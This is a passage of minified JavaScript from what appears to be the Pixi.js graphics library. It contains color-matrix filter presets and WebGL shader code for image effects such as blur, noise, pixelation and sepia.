t[0]=e[0]*r[0]+e[1]*r[5]+e[2]*r[10]+e[3]*r[15],t[1]=e[0]*r[1]+e[1]*r[6]+e[2]*r[11]+e[3]*r[16],t[2]=e[0]*r[2]+e[1]*r[7]+e[2]*r[12]+e[3]*r[17],t[3]=e[0]*r[3]+e[1]*r[8]+e[2]*r[13]+e[3]*r[18],t[4]=e[0]*r[4]+e[1]*r[9]+e[2]*r[14]+e[3]*r[19],t[5]=e[5]*r[0]+e[6]*r[5]+e[7]*r[10]+e[8]*r[15],t[6]=e[5]*r[1]+e[6]*r[6]+e[7]*r[11]+e[8]*r[16],t[7]=e[5]*r[2]+e[6]*r[7]+e[7]*r[12]+e[8]*r[17],t[8]=e[5]*r[3]+e[6]*r[8]+e[7]*r[13]+e[8]*r[18],t[9]=e[5]*r[4]+e[6]*r[9]+e[7]*r[14]+e[8]*r[19],t[10]=e[10]*r[0]+e[11]*r[5]+e[12]*r[10]+e[13]*r[15],t[11]=e[10]*r[1]+e[11]*r[6]+e[12]*r[11]+e[13]*r[16],t[12]=e[10]*r[2]+e[11]*r[7]+e[12]*r[12]+e[13]*r[17],t[13]=e[10]*r[3]+e[11]*r[8]+e[12]*r[13]+e[13]*r[18],t[14]=e[10]*r[4]+e[11]*r[9]+e[12]*r[14]+e[13]*r[19],t[15]=e[15]*r[0]+e[16]*r[5]+e[17]*r[10]+e[18]*r[15],t[16]=e[15]*r[1]+e[16]*r[6]+e[17]*r[11]+e[18]*r[16],t[17]=e[15]*r[2]+e[16]*r[7]+e[17]*r[12]+e[18]*r[17],t[18]=e[15]*r[3]+e[16]*r[8]+e[17]*r[13]+e[18]*r[18],t[19]=e[15]*r[4]+e[16]*r[9]+e[17]*r[14]+e[18]*r[19],t},i.prototype._colorMatrix=function(t){var e=new Float32Array(t);return e[4]/=255,e[9]/=255,e[14]/=255,e[19]/=255,e},i.prototype.brightness=function(t,e){var r=[t,0,0,0,0,0,t,0,0,0,0,0,t,0,0,0,0,0,1,0];this._loadMatrix(r,e)},i.prototype.greyscale=function(t,e){var r=[t,t,t,0,0,t,t,t,0,0,t,t,t,0,0,0,0,0,1,0];this._loadMatrix(r,e)},i.prototype.grayscale=i.prototype.greyscale,i.prototype.blackAndWhite=function(t){var e=[.3,.6,.1,0,0,.3,.6,.1,0,0,.3,.6,.1,0,0,0,0,0,1,0];this._loadMatrix(e,t)},i.prototype.hue=function(t,e){t=(t||0)/180*Math.PI;var r=Math.cos(t),i=Math.sin(t),n=.213,o=.715,s=.072,a=[n+r*(1-n)+i*-n,o+r*-o+i*-o,s+r*-s+i*(1-s),0,0,n+r*-n+.143*i,o+r*(1-o)+.14*i,s+r*-s+i*-.283,0,0,n+r*-n+i*-(1-n),o+r*-o+i*o,s+r*(1-s)+i*s,0,0,0,0,0,1,0];this._loadMatrix(a,e)},i.prototype.contrast=function(t,e){var r=(t||0)+1,i=-128*(r-1),n=[r,0,0,0,i,0,r,0,0,i,0,0,r,0,i,0,0,0,1,0];this._loadMatrix(n,e)},i.prototype.saturate=function(t,e){var r=2*(t||0)/3+1,i=(r-1)*-.5,n=[r,i,i,0,0,i,r,i,0,0,i,i,r,0,0,0,0,0,1,0];this._loadMatrix(n,e)},i.prototype.desaturate=function(t){this.saturate(-1)},i.prototype.negative=function(t){var e=[0,1,1,0,0,1,0,1,0,0,1,1,0,0,0,0,0,0,1,0];this._loadMatrix(e,t)},i.prototype.sepia=function(t){var e=[.393,.7689999,.18899999,0,0,.349,.6859999,.16799999,0,0,.272,.5339999,.13099999,0,0,0,0,0,1,0];this._loadMatrix(e,t)},i.prototype.technicolor=function(t){var e=[1.9125277891456083,-.8545344976951645,-.09155508482755585,0,11.793603434377337,-.3087833385928097,1.7658908555458428,-.10601743074722245,0,-70.35205161461398,-.231103377548616,-.7501899197440212,1.847597816108189,0,30.950940869491138,0,0,0,1,0];this._loadMatrix(e,t)},i.prototype.polaroid=function(t){var e=[1.438,-.062,-.062,0,0,-.122,1.378,-.122,0,0,-.016,-.016,1.483,0,0,0,0,0,1,0];this._loadMatrix(e,t)},i.prototype.toBGR=function(t){var e=[0,0,1,0,0,0,1,0,0,0,1,0,0,0,0,0,0,0,1,0];this._loadMatrix(e,t)},i.prototype.kodachrome=function(t){var e=[1.1285582396593525,-.3967382283601348,-.03992559172921793,0,63.72958762196502,-.16404339962244616,1.0835251566291304,-.05498805115633132,0,24.732407896706203,-.16786010706155763,-.5603416277695248,1.6014850761964943,0,35.62982807460946,0,0,0,1,0];this._loadMatrix(e,t)},i.prototype.browni=function(t){var e=[.5997023498159715,.34553243048391263,-.2708298674538042,0,47.43192855600873,-.037703249837783157,.8609577587992641,.15059552388459913,0,-36.96841498319127,.24113635128153335,-.07441037908422492,.44972182064877153,0,-7.562075277591283,0,0,0,1,0];this._loadMatrix(e,t)},i.prototype.vintage=function(t){var e=[.6279345635605994,.3202183420819367,-.03965408211312453,0,9.651285835294123,.02578397704808868,.6441188644374771,.03259127616149294,0,7.462829176470591,.0466055556782719,-.0851232987247891,.5241648018700465,0,5.159190588235296,0,0,0,1,0];this._loadMatrix(e,t)},i.prototype.colorTone=function(t,e,r,i,n){t=t||.2,e=e||.15,r=r||16770432,i=i||3375104;var o=(r>>16&255)/255,s=(r>>8&255)/255,a=(255&r)/255,h=(i>>16&255)/255,l=(i>>8&255)/255,u=(255&i)/255,c=[.3,.59,.11,0,0,o,s,a,t,0,h,l,u,e,0,o-h,s-l,a-u,0,0];this._loadMatrix(c,n)},i.prototype.night=function(t,e){t=t||.1;var r=[-2*t,-t,0,0,0,-t,0,t,0,0,0,t,2*t,0,0,0,0,0,1,0];this._loadMatrix(r,e)},i.prototype.predator=function(t,e){var r=[11.224130630493164*t,-4.794486999511719*t,-2.8746118545532227*t,0*t,.40342438220977783*t,-3.6330697536468506*t,9.193157196044922*t,-2.951810836791992*t,0*t,-1.316135048866272*t,-3.2184197902679443*t,-4.2375030517578125*t,7.476448059082031*t,0*t,.8044459223747253*t,0,0,0,1,0];this._loadMatrix(r,e)},i.prototype.lsd=function(t){var e=[2,-.4,.5,0,0,-.5,2,-.4,0,0,-.4,-.5,3,0,0,0,0,0,1,0];this._loadMatrix(e,t)},i.prototype.reset=function(){var t=[1,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,1,0];this._loadMatrix(t,!1)},Object.defineProperties(i.prototype,{matrix:{get:function(){return this.uniforms.m.value},set:function(t){this.uniforms.m.value=t}}})},{"../../core":29}],94:[function(t,e,r){function i(){n.AbstractFilter.call(this,null,"precision mediump float;\n\nvarying vec2 vTextureCoord;\n\nuniform sampler2D uSampler;\nuniform float step;\n\nvoid main(void)\n{\n    vec4 color = texture2D(uSampler, vTextureCoord);\n\n    color = floor(color * step) / step;\n\n    gl_FragColor = color;\n}\n",{step:{type:"1f",value:5}})}var n=t("../../core");i.prototype=Object.create(n.AbstractFilter.prototype),i.prototype.constructor=i,e.exports=i,Object.defineProperties(i.prototype,{step:{get:function(){return this.uniforms.step.value},set:function(t){this.uniforms.step.value=t;
}}})},{"../../core":29}],95:[function(t,e,r){function i(t,e,r){n.AbstractFilter.call(this,null,"precision mediump float;\n\nvarying mediump vec2 vTextureCoord;\n\nuniform sampler2D uSampler;\nuniform vec2 texelSize;\nuniform float matrix[9];\n\nvoid main(void)\n{\n   vec4 c11 = texture2D(uSampler, vTextureCoord - texelSize); // top left\n   vec4 c12 = texture2D(uSampler, vec2(vTextureCoord.x, vTextureCoord.y - texelSize.y)); // top center\n   vec4 c13 = texture2D(uSampler, vec2(vTextureCoord.x + texelSize.x, vTextureCoord.y - texelSize.y)); // top right\n\n   vec4 c21 = texture2D(uSampler, vec2(vTextureCoord.x - texelSize.x, vTextureCoord.y)); // mid left\n   vec4 c22 = texture2D(uSampler, vTextureCoord); // mid center\n   vec4 c23 = texture2D(uSampler, vec2(vTextureCoord.x + texelSize.x, vTextureCoord.y)); // mid right\n\n   vec4 c31 = texture2D(uSampler, vec2(vTextureCoord.x - texelSize.x, vTextureCoord.y + texelSize.y)); // bottom left\n   vec4 c32 = texture2D(uSampler, vec2(vTextureCoord.x, vTextureCoord.y + texelSize.y)); // bottom center\n   vec4 c33 = texture2D(uSampler, vTextureCoord + texelSize); // bottom right\n\n   gl_FragColor =\n       c11 * matrix[0] + c12 * matrix[1] + c13 * matrix[2] +\n       c21 * matrix[3] + c22 * matrix[4] + c23 * matrix[5] +\n       c31 * matrix[6] + c32 * matrix[7] + c33 * matrix[8];\n\n   gl_FragColor.a = c22.a;\n}\n",{matrix:{type:"1fv",value:new Float32Array(t)},texelSize:{type:"v2",value:{x:1/e,y:1/r}}})}var n=t("../../core");i.prototype=Object.create(n.AbstractFilter.prototype),i.prototype.constructor=i,e.exports=i,Object.defineProperties(i.prototype,{matrix:{get:function(){return this.uniforms.matrix.value},set:function(t){this.uniforms.matrix.value=new Float32Array(t)}},width:{get:function(){return 1/this.uniforms.texelSize.value.x},set:function(t){this.uniforms.texelSize.value.x=1/t}},height:{get:function(){return 1/this.uniforms.texelSize.value.y},set:function(t){this.uniforms.texelSize.value.y=1/t}}})},{"../../core":29}],96:[function(t,e,r){function i(){n.AbstractFilter.call(this,null,"precision mediump float;\n\nvarying vec2 vTextureCoord;\n\nuniform sampler2D uSampler;\n\nvoid main(void)\n{\n    float lum = length(texture2D(uSampler, vTextureCoord.xy).rgb);\n\n    gl_FragColor = vec4(1.0, 1.0, 1.0, 1.0);\n\n    if (lum < 1.00)\n    {\n        if (mod(gl_FragCoord.x + gl_FragCoord.y, 10.0) == 0.0)\n        {\n            gl_FragColor = vec4(0.0, 0.0, 0.0, 1.0);\n        }\n    }\n\n    if (lum < 0.75)\n    {\n        if (mod(gl_FragCoord.x - gl_FragCoord.y, 10.0) == 0.0)\n        {\n            gl_FragColor = vec4(0.0, 0.0, 0.0, 1.0);\n        }\n    }\n\n    if (lum < 0.50)\n    {\n        if (mod(gl_FragCoord.x + gl_FragCoord.y - 5.0, 10.0) == 0.0)\n        {\n            gl_FragColor = vec4(0.0, 0.0, 0.0, 1.0);\n        }\n    }\n\n    if (lum < 0.3)\n    {\n        if (mod(gl_FragCoord.x - gl_FragCoord.y - 5.0, 10.0) == 0.0)\n        {\n            gl_FragColor = vec4(0.0, 0.0, 0.0, 1.0);\n        }\n    }\n}\n")}var n=t("../../core");i.prototype=Object.create(n.AbstractFilter.prototype),i.prototype.constructor=i,e.exports=i},{"../../core":29}],97:[function(t,e,r){function i(t){var e=new n.Matrix;t.renderable=!1,n.AbstractFilter.call(this,"attribute vec2 aVertexPosition;\nattribute vec2 aTextureCoord;\nattribute vec4 aColor;\n\nuniform mat3 projectionMatrix;\nuniform mat3 otherMatrix;\n\nvarying vec2 vMapCoord;\nvarying vec2 vTextureCoord;\nvarying vec4 vColor;\n\nvoid main(void)\n{\n   gl_Position = vec4((projectionMatrix * vec3(aVertexPosition, 1.0)).xy, 0.0, 1.0);\n   vTextureCoord = aTextureCoord;\n   vMapCoord = ( otherMatrix * vec3( aTextureCoord, 1.0)  ).xy;\n   vColor = vec4(aColor.rgb * aColor.a, aColor.a);\n}\n","precision lowp float;\n\nvarying vec2 vMapCoord;\nvarying vec2 vTextureCoord;\nvarying vec4 vColor;\n\nuniform vec2 scale;\n\nuniform sampler2D uSampler;\nuniform sampler2D mapSampler;\n\nvoid main(void)\n{\n   vec4 original =  texture2D(uSampler, vTextureCoord);\n   vec4 map =  texture2D(mapSampler, vMapCoord);\n\n   map -= 0.5;\n   map.xy *= scale;\n\n   gl_FragColor = texture2D(uSampler, vec2(vTextureCoord.x + map.x, vTextureCoord.y + map.y));\n}\n",{mapSampler:{type:"sampler2D",value:t.texture},otherMatrix:{type:"mat3",value:e.toArray(!0)},scale:{type:"v2",value:{x:1,y:1}}}),this.maskSprite=t,this.maskMatrix=e,this.scale=new n.Point(20,20)}var n=t("../../core");i.prototype=Object.create(n.AbstractFilter.prototype),i.prototype.constructor=i,e.exports=i,i.prototype.applyFilter=function(t,e,r){var i=t.filterManager;i.calculateMappedMatrix(e.frame,this.maskSprite,this.maskMatrix),this.uniforms.otherMatrix.value=this.maskMatrix.toArray(!0),this.uniforms.scale.value.x=this.scale.x*(1/e.frame.width),this.uniforms.scale.value.y=this.scale.y*(1/e.frame.height);var n=this.getShader(t);i.applyFilter(n,e,r)},Object.defineProperties(i.prototype,{map:{get:function(){return this.uniforms.mapSampler.value},set:function(t){this.uniforms.mapSampler.value=t}}})},{"../../core":29}],98:[function(t,e,r){function i(){n.AbstractFilter.call(this,null,"precision mediump float;\n\nvarying vec2 vTextureCoord;\nvarying vec4 vColor;\n\nuniform vec4 dimensions;\nuniform sampler2D uSampler;\n\nuniform float angle;\nuniform float scale;\n\nfloat pattern()\n{\n   float s = sin(angle), c = cos(angle);\n   vec2 tex = vTextureCoord * dimensions.xy;\n   vec2 point = vec2(\n       c * tex.x - s * tex.y,\n       s * tex.x + c * tex.y\n   ) * scale;\n   return (sin(point.x) * sin(point.y)) * 4.0;\n}\n\nvoid main()\n{\n   vec4 color = texture2D(uSampler, vTextureCoord);\n   float average = (color.r + color.g + color.b) / 3.0;\n   gl_FragColor = vec4(vec3(average * 10.0 - 5.0 + pattern()), color.a);\n}\n",{scale:{type:"1f",value:1},angle:{type:"1f",value:5},dimensions:{type:"4fv",value:[0,0,0,0]}})}var n=t("../../core");i.prototype=Object.create(n.AbstractFilter.prototype),i.prototype.constructor=i,e.exports=i,Object.defineProperties(i.prototype,{scale:{get:function(){return this.uniforms.scale.value},set:function(t){this.uniforms.scale.value=t}},angle:{get:function(){return this.uniforms.angle.value},set:function(t){this.uniforms.angle.value=t}}})},{"../../core":29}],99:[function(t,e,r){function i(){n.AbstractFilter.call(this,"attribute vec2 aVertexPosition;\nattribute vec2 aTextureCoord;\nattribute vec4 aColor;\n\nuniform float strength;\nuniform vec2 offset;\n\nuniform mat3 projectionMatrix;\n\nvarying vec2 vTextureCoord;\nvarying vec4 vColor;\nvarying vec2 vBlurTexCoords[6];\n\nvoid main(void)\n{\n    gl_Position = vec4((projectionMatrix * vec3((aVertexPosition+offset), 1.0)).xy, 0.0, 1.0);\n    vTextureCoord = aTextureCoord;\n\n    vBlurTexCoords[ 0] = aTextureCoord + vec2(0.0, -0.012 * strength);\n    vBlurTexCoords[ 1] = aTextureCoord + vec2(0.0, -0.008 * strength);\n    vBlurTexCoords[ 2] = aTextureCoord + vec2(0.0, -0.004 * strength);\n    vBlurTexCoords[ 3] = aTextureCoord + vec2(0.0,  0.004 * strength);\n    vBlurTexCoords[ 4] = aTextureCoord + vec2(0.0,  0.008 * strength);\n    vBlurTexCoords[ 5] = aTextureCoord + vec2(0.0,  0.012 * strength);\n\n   vColor = vec4(aColor.rgb * aColor.a, aColor.a);\n}\n","precision lowp float;\n\nvarying vec2 vTextureCoord;\nvarying vec2 vBlurTexCoords[6];\nvarying vec4 vColor;\n\nuniform vec3 color;\nuniform float alpha;\n\nuniform sampler2D uSampler;\n\nvoid main(void)\n{\n    vec4 sum = vec4(0.0);\n\n    sum += texture2D(uSampler, vBlurTexCoords[ 0])*0.004431848411938341;\n    sum += texture2D(uSampler, vBlurTexCoords[ 1])*0.05399096651318985;\n    sum += texture2D(uSampler, vBlurTexCoords[ 2])*0.2419707245191454;\n    sum += texture2D(uSampler, vTextureCoord     )*0.3989422804014327;\n    sum += texture2D(uSampler, vBlurTexCoords[ 3])*0.2419707245191454;\n    sum += texture2D(uSampler, vBlurTexCoords[ 4])*0.05399096651318985;\n    sum += texture2D(uSampler, vBlurTexCoords[ 5])*0.004431848411938341;\n\n    gl_FragColor = vec4( color.rgb * sum.a * alpha, sum.a * alpha );\n}\n",{blur:{type:"1f",value:1/512},color:{type:"c",value:[0,0,0]},alpha:{type:"1f",value:.7},offset:{type:"2f",value:[5,5]},strength:{type:"1f",value:1}}),this.passes=1,this.strength=4}var n=t("../../core");i.prototype=Object.create(n.AbstractFilter.prototype),i.prototype.constructor=i,e.exports=i,i.prototype.applyFilter=function(t,e,r,i){var n=this.getShader(t);if(this.uniforms.strength.value=this.strength/4/this.passes*(e.frame.height/e.size.height),1===this.passes)t.filterManager.applyFilter(n,e,r,i);else{for(var o=t.filterManager.getRenderTarget(!0),s=e,a=o,h=0;h<this.passes-1;h++){t.filterManager.applyFilter(n,s,a,i);var l=a;a=s,s=l}t.filterManager.applyFilter(n,s,r,i),t.filterManager.returnRenderTarget(o)}},Object.defineProperties(i.prototype,{blur:{get:function(){return this.strength},set:function(t){this.padding=.5*t,this.strength=t}}})},{"../../core":29}],100:[function(t,e,r){function i(){n.AbstractFilter.call(this),this.blurXFilter=new o,this.blurYTintFilter=new s,this.defaultFilter=new n.AbstractFilter,this.padding=30,this._dirtyPosition=!0,this._angle=45*Math.PI/180,this._distance=10,this.alpha=.75,this.hideObject=!1,this.blendMode=n.BLEND_MODES.MULTIPLY}var n=t("../../core"),o=t("../blur/BlurXFilter"),s=t("./BlurYTintFilter");i.prototype=Object.create(n.AbstractFilter.prototype),i.prototype.constructor=i,e.exports=i,i.prototype.applyFilter=function(t,e,r){var i=t.filterManager.getRenderTarget(!0);this._dirtyPosition&&(this._dirtyPosition=!1,this.blurYTintFilter.uniforms.offset.value[0]=Math.sin(this._angle)*this._distance,this.blurYTintFilter.uniforms.offset.value[1]=Math.cos(this._angle)*this._distance),this.blurXFilter.applyFilter(t,e,i),t.blendModeManager.setBlendMode(this.blendMode),this.blurYTintFilter.applyFilter(t,i,r),t.blendModeManager.setBlendMode(n.BLEND_MODES.NORMAL),this.hideObject||this.defaultFilter.applyFilter(t,e,r),t.filterManager.returnRenderTarget(i)},Object.defineProperties(i.prototype,{blur:{get:function(){return this.blurXFilter.blur},set:function(t){this.blurXFilter.blur=this.blurYTintFilter.blur=t}},blurX:{get:function(){return this.blurXFilter.blur},set:function(t){this.blurXFilter.blur=t}},blurY:{get:function(){return this.blurYTintFilter.blur},set:function(t){this.blurYTintFilter.blur=t}},color:{get:function(){return n.utils.rgb2hex(this.blurYTintFilter.uniforms.color.value)},set:function(t){this.blurYTintFilter.uniforms.color.value=n.utils.hex2rgb(t)}},alpha:{get:function(){return this.blurYTintFilter.uniforms.alpha.value},set:function(t){this.blurYTintFilter.uniforms.alpha.value=t}},distance:{get:function(){return this._distance},set:function(t){this._dirtyPosition=!0,this._distance=t}},angle:{get:function(){return this._angle},set:function(t){this._dirtyPosition=!0,this._angle=t}}})},{"../../core":29,"../blur/BlurXFilter":90,"./BlurYTintFilter":99}],101:[function(t,e,r){function i(){n.AbstractFilter.call(this,null,"precision mediump float;\n\nvarying vec2 vTextureCoord;\nvarying vec4 vColor;\n\nuniform sampler2D uSampler;\nuniform float gray;\n\nvoid main(void)\n{\n   gl_FragColor = texture2D(uSampler, vTextureCoord);\n   gl_FragColor.rgb = mix(gl_FragColor.rgb, vec3(0.2126*gl_FragColor.r + 0.7152*gl_FragColor.g + 0.0722*gl_FragColor.b), gray);\n}\n",{gray:{type:"1f",value:1}})}var n=t("../../core");i.prototype=Object.create(n.AbstractFilter.prototype),i.prototype.constructor=i,e.exports=i,Object.defineProperties(i.prototype,{gray:{get:function(){return this.uniforms.gray.value},set:function(t){this.uniforms.gray.value=t}}})},{"../../core":29}],102:[function(t,e,r){e.exports={AsciiFilter:t("./ascii/AsciiFilter"),BloomFilter:t("./bloom/BloomFilter"),BlurFilter:t("./blur/BlurFilter"),BlurXFilter:t("./blur/BlurXFilter"),BlurYFilter:t("./blur/BlurYFilter"),BlurDirFilter:t("./blur/BlurDirFilter"),ColorMatrixFilter:t("./color/ColorMatrixFilter"),ColorStepFilter:t("./color/ColorStepFilter"),ConvolutionFilter:t("./convolution/ConvolutionFilter"),CrossHatchFilter:t("./crosshatch/CrossHatchFilter"),DisplacementFilter:t("./displacement/DisplacementFilter"),DotScreenFilter:t("./dot/DotScreenFilter"),GrayFilter:t("./gray/GrayFilter"),DropShadowFilter:t("./dropshadow/DropShadowFilter"),InvertFilter:t("./invert/InvertFilter"),NoiseFilter:t("./noise/NoiseFilter"),NormalMapFilter:t("./normal/NormalMapFilter"),PixelateFilter:t("./pixelate/PixelateFilter"),RGBSplitFilter:t("./rgb/RGBSplitFilter"),ShockwaveFilter:t("./shockwave/ShockwaveFilter"),SepiaFilter:t("./sepia/SepiaFilter"),SmartBlurFilter:t("./blur/SmartBlurFilter"),TiltShiftFilter:t("./tiltshift/TiltShiftFilter"),TiltShiftXFilter:t("./tiltshift/TiltShiftXFilter"),TiltShiftYFilter:t("./tiltshift/TiltShiftYFilter"),TwistFilter:t("./twist/TwistFilter")}},{"./ascii/AsciiFilter":86,"./bloom/BloomFilter":87,"./blur/BlurDirFilter":88,"./blur/BlurFilter":89,"./blur/BlurXFilter":90,"./blur/BlurYFilter":91,"./blur/SmartBlurFilter":92,"./color/ColorMatrixFilter":93,"./color/ColorStepFilter":94,"./convolution/ConvolutionFilter":95,"./crosshatch/CrossHatchFilter":96,"./displacement/DisplacementFilter":97,"./dot/DotScreenFilter":98,"./dropshadow/DropShadowFilter":100,"./gray/GrayFilter":101,"./invert/InvertFilter":103,"./noise/NoiseFilter":104,"./normal/NormalMapFilter":105,"./pixelate/PixelateFilter":106,"./rgb/RGBSplitFilter":107,"./sepia/SepiaFilter":108,"./shockwave/ShockwaveFilter":109,"./tiltshift/TiltShiftFilter":111,"./tiltshift/TiltShiftXFilter":112,"./tiltshift/TiltShiftYFilter":113,"./twist/TwistFilter":114}],103:[function(t,e,r){function i(){n.AbstractFilter.call(this,null,"precision mediump float;\n\nvarying vec2 vTextureCoord;\n\nuniform float invert;\nuniform sampler2D uSampler;\n\nvoid main(void)\n{\n    gl_FragColor = texture2D(uSampler, vTextureCoord);\n\n    gl_FragColor.rgb = mix( (vec3(1)-gl_FragColor.rgb) * gl_FragColor.a, gl_FragColor.rgb, 1.0 - invert);\n}\n",{invert:{type:"1f",value:1}})}var n=t("../../core");i.prototype=Object.create(n.AbstractFilter.prototype),i.prototype.constructor=i,e.exports=i,Object.defineProperties(i.prototype,{invert:{get:function(){return this.uniforms.invert.value},set:function(t){this.uniforms.invert.value=t}}})},{"../../core":29}],104:[function(t,e,r){function i(){n.AbstractFilter.call(this,null,"precision mediump float;\n\nvarying vec2 vTextureCoord;\nvarying vec4 vColor;\n\nuniform float noise;\nuniform sampler2D uSampler;\n\nfloat rand(vec2 co)\n{\n    return fract(sin(dot(co.xy, vec2(12.9898, 78.233))) * 43758.5453);\n}\n\nvoid main()\n{\n    vec4 color = texture2D(uSampler, vTextureCoord);\n\n    float diff = (rand(vTextureCoord) - 0.5) * noise;\n\n    color.r += diff;\n    color.g += diff;\n    color.b += diff;\n\n    gl_FragColor = color;\n}\n",{noise:{type:"1f",value:.5}})}var n=t("../../core");i.prototype=Object.create(n.AbstractFilter.prototype),i.prototype.constructor=i,e.exports=i,Object.defineProperties(i.prototype,{noise:{get:function(){return this.uniforms.noise.value},set:function(t){this.uniforms.noise.value=t}}})},{"../../core":29}],105:[function(t,e,r){function i(t){n.AbstractFilter.call(this,null,"precision mediump float;\n\nvarying vec2 vTextureCoord;\nvarying vec4 vColor;\n\nuniform sampler2D displacementMap;\nuniform sampler2D uSampler;\n\nuniform vec4 dimensions;\n\nconst vec2 Resolution = vec2(1.0,1.0);      //resolution of screen\nuniform vec3 LightPos;    //light position, normalized\nconst vec4 LightColor = vec4(1.0, 1.0, 1.0, 1.0);      //light RGBA -- alpha is intensity\nconst vec4 AmbientColor = vec4(1.0, 1.0, 1.0, 0.5);    //ambient RGBA -- alpha is intensity\nconst vec3 Falloff = vec3(0.0, 1.0, 0.2);         //attenuation coefficients\n\nuniform vec3 LightDir; // = vec3(1.0, 0.0, 1.0);\n\nuniform vec2 mapDimensions; // = vec2(256.0, 256.0);\n\n\nvoid main(void)\n{\n    vec2 mapCords = vTextureCoord.xy;\n\n    vec4 color = texture2D(uSampler, vTextureCoord.st);\n    vec3 nColor = texture2D(displacementMap, vTextureCoord.st).rgb;\n\n\n    mapCords *= vec2(dimensions.x/512.0, dimensions.y/512.0);\n\n    mapCords.y *= -1.0;\n    mapCords.y += 1.0;\n\n    // RGBA of our diffuse color\n    vec4 DiffuseColor = texture2D(uSampler, vTextureCoord);\n\n    // RGB of our normal map\n    vec3 NormalMap = texture2D(displacementMap, mapCords).rgb;\n\n    // The delta position of light\n    // vec3 LightDir = vec3(LightPos.xy - (gl_FragCoord.xy / Resolution.xy), LightPos.z);\n    vec3 LightDir = vec3(LightPos.xy - (mapCords.xy), LightPos.z);\n\n    // Correct for aspect ratio\n    // LightDir.x *= Resolution.x / Resolution.y;\n\n    // Determine distance (used for attenuation) BEFORE we normalize our LightDir\n    float D = length(LightDir);\n\n    // normalize our vectors\n    vec3 N = normalize(NormalMap * 2.0 - 1.0);\n    vec3 L = normalize(LightDir);\n\n    // Pre-multiply light color with intensity\n    // Then perform 'N dot L' to determine our diffuse term\n    vec3 Diffuse = (LightColor.rgb * LightColor.a) * max(dot(N, L), 0.0);\n\n    // pre-multiply ambient color with intensity\n    vec3 Ambient = AmbientColor.rgb * AmbientColor.a;\n\n    // calculate attenuation\n    float Attenuation = 1.0 / ( Falloff.x + (Falloff.y*D) + (Falloff.z*D*D) );\n\n    // the calculation which brings it all together\n    vec3 Intensity = Ambient + Diffuse * Attenuation;\n    vec3 FinalColor = DiffuseColor.rgb * Intensity;\n    gl_FragColor = vColor * vec4(FinalColor, DiffuseColor.a);\n\n    // gl_FragColor = vec4(1.0, 0.0, 0.0, Attenuation); // vColor * vec4(FinalColor, DiffuseColor.a);\n\n/*\n    // normalise color\n    vec3 normal = normalize(nColor * 2.0 - 1.0);\n\n    vec3 deltaPos = vec3( (light.xy - gl_FragCoord.xy) / resolution.xy, light.z );\n\n    float lambert = clamp(dot(normal, lightDir), 0.0, 1.0);\n\n    float d = sqrt(dot(deltaPos, deltaPos));\n    float att = 1.0 / ( attenuation.x + (attenuation.y*d) + (attenuation.z*d*d) );\n\n    vec3 result = (ambientColor * ambientIntensity) + (lightColor.rgb * lambert) * att;\n    result *= color.rgb;\n\n    gl_FragColor = vec4(result, 1.0);\n*/\n}\n",{displacementMap:{type:"sampler2D",value:t},scale:{type:"2f",value:{x:15,y:15}},offset:{type:"2f",value:{x:0,y:0}},mapDimensions:{type:"2f",value:{x:1,y:1}},dimensions:{type:"4f",value:[0,0,0,0]},LightPos:{type:"3f",value:[0,1,0]}}),t.baseTexture._powerOf2=!0,t.baseTexture.hasLoaded?this.onTextureLoaded():t.baseTexture.once("loaded",this.onTextureLoaded,this)}var n=t("../../core");i.prototype=Object.create(n.AbstractFilter.prototype),i.prototype.constructor=i,e.exports=i,i.prototype.onTextureLoaded=function(){this.uniforms.mapDimensions.value.x=this.uniforms.displacementMap.value.width,this.uniforms.mapDimensions.value.y=this.uniforms.displacementMap.value.height},Object.defineProperties(i.prototype,{map:{get:function(){return this.uniforms.displacementMap.value},set:function(t){this.uniforms.displacementMap.value=t}},scale:{get:function(){return this.uniforms.scale.value},set:function(t){this.uniforms.scale.value=t}},offset:{get:function(){return this.uniforms.offset.value},set:function(t){this.uniforms.offset.value=t}}})},{"../../core":29}],106:[function(t,e,r){function i(){n.AbstractFilter.call(this,null,"precision mediump float;\n\nvarying vec2 vTextureCoord;\n\nuniform vec4 dimensions;\nuniform vec2 pixelSize;\nuniform sampler2D uSampler;\n\nvoid main(void)\n{\n    vec2 coord = vTextureCoord;\n\n    vec2 size = dimensions.xy / pixelSize;\n\n    vec2 color = floor( ( vTextureCoord * size ) ) / size + pixelSize/dimensions.xy * 0.5;\n\n    gl_FragColor = texture2D(uSampler, color);\n}\n",{dimensions:{type:"4fv",value:new Float32Array([0,0,0,0])},pixelSize:{type:"v2",value:{x:10,y:10}}})}var n=t("../../core");i.prototype=Object.create(n.AbstractFilter.prototype),i.prototype.constructor=i,e.exports=i,Object.defineProperties(i.prototype,{size:{get:function(){return this.uniforms.pixelSize.value},set:function(t){this.uniforms.pixelSize.value=t}}})},{"../../core":29}],107:[function(t,e,r){function i(){n.AbstractFilter.call(this,null,"precision mediump float;\n\nvarying vec2 vTextureCoord;\n\nuniform sampler2D uSampler;\nuniform vec4 dimensions;\nuniform vec2 red;\nuniform vec2 green;\nuniform vec2 blue;\n\nvoid main(void)\n{\n   gl_FragColor.r = texture2D(uSampler, vTextureCoord + red/dimensions.xy).r;\n   gl_FragColor.g = texture2D(uSampler, vTextureCoord + green/dimensions.xy).g;\n   gl_FragColor.b = texture2D(uSampler, vTextureCoord + blue/dimensions.xy).b;\n   gl_FragColor.a = texture2D(uSampler, vTextureCoord).a;\n}\n",{red:{type:"v2",value:{x:20,y:20}},green:{type:"v2",value:{x:-20,y:20}},blue:{type:"v2",value:{x:20,y:-20}},dimensions:{type:"4fv",value:[0,0,0,0]}})}var n=t("../../core");i.prototype=Object.create(n.AbstractFilter.prototype),i.prototype.constructor=i,e.exports=i,Object.defineProperties(i.prototype,{red:{get:function(){return this.uniforms.red.value},set:function(t){this.uniforms.red.value=t}},green:{get:function(){return this.uniforms.green.value},set:function(t){this.uniforms.green.value=t}},blue:{get:function(){return this.uniforms.blue.value},set:function(t){this.uniforms.blue.value=t}}})},{"../../core":29}],108:[function(t,e,r){function i(){n.AbstractFilter.call(this,null,"precision mediump float;\n\nvarying vec2 vTextureCoord;\n\nuniform sampler2D uSampler;\nuniform float sepia;\n\nconst mat3 sepiaMatrix = mat3(0.3588, 0.7044, 0.1368, 0.2990, 0.5870, 0.1140, 0.2392, 0.4696, 0.0912);\n\nvoid main(void)\n{\n   gl_FragColor = texture2D(uSampler, vTextureCoord);\n   gl_FragColor.rgb = mix( gl_FragColor.rgb, gl_FragColor.rgb * sepiaMatrix, 